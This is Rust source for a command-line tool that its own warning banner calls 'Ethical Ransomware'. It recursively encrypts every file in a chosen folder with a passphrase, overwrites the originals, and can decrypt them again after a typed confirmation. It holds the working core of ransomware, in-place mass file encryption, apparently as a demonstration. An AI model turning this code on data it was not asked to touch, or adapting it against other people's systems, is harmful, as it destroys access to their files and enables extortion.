// Import necessary crates and modules
extern crate clap; // Command Line Argument Parser
extern crate age; // Encryption and decryption crate
extern crate walkdir; // Directory traversal

use age::{Encryptor, Decryptor}; // Import Encryptor and Decryptor from the 'age' crate
use clap::{App, Arg, SubCommand}; // Import App, Arg, and SubCommand for CLI interaction
use secrecy::Secret; // Import Secret for securely handling sensitive information
use std::fs::File; // Import File for file operations
use walkdir::WalkDir; // Import WalkDir for walking through directory contents
use std::io::{self, Read, Write}; // Import standard I/O traits for reading and writing
use std::env;
use std::process;
use std::thread;
use std::time::Duration;

// Define a struct to handle folder processing
struct FolderProcessor {
    path: String,
    passphrase: String,
}

impl FolderProcessor {
    // Constructor for FolderProcessor
    fn new(path: &str, passphrase: &str) -> FolderProcessor {
        FolderProcessor {
            path: path.to_string(),
            passphrase: passphrase.to_string(),
        }
    }

    // Method to encrypt a folder
    fn encrypt(&self) -> io::Result<()> {
        // Iterate over each file in the directory
        for entry in WalkDir::new(&self.path) {
            let entry = entry?;
            let path = entry.path();

            // Skip directories, only encrypt files
            if path.is_dir() {
                continue;
            }

            print!("\n\tEncrypting file: {}", path.display());

            // Read the file's contents
            let mut file = File::open(path)?;
            let mut contents = Vec::new();
            file.read_to_end(&mut contents)?;

            // Encrypt the contents using the provided passphrase
            let encryptor = Encryptor::with_user_passphrase(Secret::new(self.passphrase.to_string()));
            let mut encrypted_writer = vec![];
            {
                let mut writer = match encryptor.wrap_output(&mut encrypted_writer) {
                    Ok(w) => w,
                    Err(e) => return Err(io::Error::new(io::ErrorKind::Other, e)),
                };
                writer.write_all(&contents)?;
                writer.finish()?;
            }

            // Replace the file with its encrypted version
            let mut file = File::create(path)?;
            file.write_all(&encrypted_writer)?;
        }

        Ok(())
    }


    // Method to decrypt a folder
    fn decrypt(&self) -> io::Result<()> {
        // Iterate over each file in the directory
        for entry in WalkDir::new(&self.path) {
            let entry = entry?;
            let path = entry.path();

            // Skip directories, only decrypt files
            if path.is_dir() {
                continue;
            }

            print!("\n\tDecrypting file: {}", path.display());

            // Read the encrypted file's contents
            let mut file = File::open(path)?;
            let mut encrypted_contents = Vec::new();
            file.read_to_end(&mut encrypted_contents)?;

            // Attempt to create a decryptor
            let decryptor_result = Decryptor::new(&encrypted_contents[..]);

            let mut decrypted_contents = Vec::new();

            // Handle the result of decryptor creation
            match decryptor_result {
                Ok(decryptor) => {
                    // Handle different types of decryptors, focusing on passphrase decryptors
                    match decryptor {
                        Decryptor::Passphrase(d) => {
                            // Attempt to decrypt with the provided passphrase
                            let reader_result = d.decrypt(&Secret::new(self.passphrase.to_string()), None);
                            match reader_result {
                                Ok(mut reader) => {
                                    // Read and store the decrypted contents
                                    reader.read_to_end(&mut decrypted_contents)?;
                                },
                                // Handle decryption errors
                                Err(e) => return Err(io::Error::new(io::ErrorKind::Other, format!("Decryption failed: {}", e))),
                            }
                        },
                        // Handle unsupported decryptor types
                        _ => return Err(io::Error::new(io::ErrorKind::Other, "Unsupported decryptor type")),
                    }
                },
                // Handle errors in creating the decryptor
                Err(e) => return Err(io::Error::new(io::ErrorKind::Other, format!("Failed to create decryptor: {}", e))),
            };

            // Replace the encrypted file with its decrypted version
            let mut file = File::create(path)?;
            file.write_all(&decrypted_contents)?;
        }

        Ok(())
    }

}

// Main function - entry point of the program
fn main() {
    // Parse the command line arguments
    let args: Vec<String> = env::args().collect();

    if args.len() < 4 {
        eprintln!("Usage: cargo run -- <encrypt/decrypt> <path> <passphrase>");
        process::exit(1);
    }

    // Setup the command-line interface
    let matches = App::new("Folder Encryption CLI")
        .version("1.3") // Set version
        .author("Maaz Sabah Uddin") // Set author
        .about("Encrypts and Decrypts folders") // Program description
        .subcommand(SubCommand::with_name("encrypt")
            .about("Encrypts a folder")
            .arg(Arg::with_name("FOLDER")
                .help("Sets the input folder to use")
                .required(true)
                .index(1))
            .arg(Arg::with_name("PASSPHRASE")
                .help("Sets the passphrase for encryption")
                .required(true)
                .index(2)))
        .subcommand(SubCommand::with_name("decrypt")
            .about("Decrypts a folder")
            .arg(Arg::with_name("FOLDER")
                .help("Sets the input folder to use")
                .required(true)
                .index(1))
            .arg(Arg::with_name("PASSPHRASE")
                .help("Sets the passphrase for decryption")
                .required(true)
                .index(2)))
        .get_matches();

    // Handle 'encrypt' subcommand
    if let Some(matches) = matches.subcommand_matches("encrypt") {

        for _ in 0..5 {
            println!("\n\n\tWARNING: This project is Ethical Ransomware and can encrypt your overall drive and ask for ransom. Please only encrypt that folder 
            which is not important to you. Otherwise, you will lose access and have to pay ransom to get the decrypt passphrase.");
            thread::sleep(Duration::from_secs(2));
        }

        let folder = matches.value_of("FOLDER").unwrap();
        let passphrase = matches.value_of("PASSPHRASE").unwrap();

        println!("\n\n\tAre you sure you want to encrypt the folder '{}' with passphrase '{}'? (yes/no)", folder, passphrase);
        let mut user_input = String::new();
        io::stdin().read_line(&mut user_input).expect("Failed to read line");

        if user_input.trim().eq_ignore_ascii_case("yes") {
            let processor = FolderProcessor::new(folder, passphrase);
            match processor.encrypt() {
                Ok(_) => println!("\n\n\tFolder encrypted successfully!"),
                Err(e) => eprintln!("\n\tError encrypting folder: {}", e),
            }
        } else {
            println!("\n\tEncryption cancelled. Exiting program.");
            process::exit(0);
        }
        
    // Handle 'decrypt' subcommand
    } else if let Some(matches) = matches.subcommand_matches("decrypt") {

        for _ in 0..5 {
            println!("\n\n\tWARNING: You are about to decrypt a folder. Ensure you have the correct passphrase, as entering an incorrect passphrase 
            could result in permanent data loss or corruption. Use this tool responsibly and only decrypt folders for which you have explicit 
            permission and the correct decryption key. Misuse of this tool can lead to serious consequences.");
            thread::sleep(Duration::from_secs(2));
        }

        if let (Some(folder), Some(passphrase)) = (matches.value_of("FOLDER"), matches.value_of("PASSPHRASE")) {
            let processor = FolderProcessor::new(folder, passphrase);
            match processor.decrypt() {
                Ok(_) => println!("\n\n\tFolder decrypted successfully!"),
                Err(e) => eprintln!("\n\tError decrypting folder: {}", e),
            }
        }
    }
}
